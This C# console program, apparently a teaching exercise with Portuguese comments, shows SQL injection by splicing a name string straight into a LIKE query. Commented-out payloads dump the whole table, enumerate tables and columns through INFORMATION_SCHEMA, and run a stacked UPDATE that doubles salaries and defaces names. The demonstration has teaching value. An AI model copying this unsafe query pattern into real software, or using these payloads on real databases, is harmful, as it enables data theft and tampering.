using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;

namespace _006_xxxSqlInjection
{
    class Program
    {
        static void Main(string[] args)
        {
            //retornar primeira coluna e primeira linha

            var cs = @"Data Source=.\sqlexpress;Initial Catalog=DB;Integrated Security=true";

            //xxx.udl

            //using para usar um recurso externo, pelo fato de não ser ecrito em dot net
            //para liberação de memória, algumas classes montam a classe herdando do exposeble
            //c.dispose

            using (var c = new SqlConnection(cs))
            {
                String nomePessoaParcial = "CA";
                //String nomePessoaParcial = "CA' or 1=1 --";
                //por dar true ele traz a tabela inteira

                //String nomePessoaParcial = "CA' UNION SELECT 0, TABLE_NAME, 0 FROM INFORMATION_SCHEMA.TABLES --";
                //String nomePessoaParcial = "CA' UNION SELECT 0, '*' + TABLE_NAME, 0 FROM INFORMATION_SCHEMA.TABLES UNION SELECT 0, COLUMN_NAME, 0 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'PESSOA' --";
                //var nomePessoaParcial = "CA'; UPDATE PESSOA SET NOME_PESSOA = LOWER(NOME_PESSOA) + ' -> O ERIC PASSOU AQUI!', SALARIO_PESSOA = SALARIO_PESSOA * 2; --";

                var cmd = "SELECT * FROM PESSOA WHERE NOME_PESSOA LIKE '%" + nomePessoaParcial + "%'";

                using (var k = new SqlCommand(cmd, c))
                {

                    c.Open();

                    var dr = k.ExecuteReader();

                    while (dr.Read())
                    {
                        //for (int i = 0; i < dr.FieldCount; i++)//{}

                        Console.WriteLine(dr[0]);
                        Console.WriteLine(dr[1]);
                        Console.WriteLine(dr[2]);

                        Console.WriteLine();

                    }

                    c.Close();

                    Console.ReadKey();


                }

            }

            Console.ReadKey();
        }
    }
}
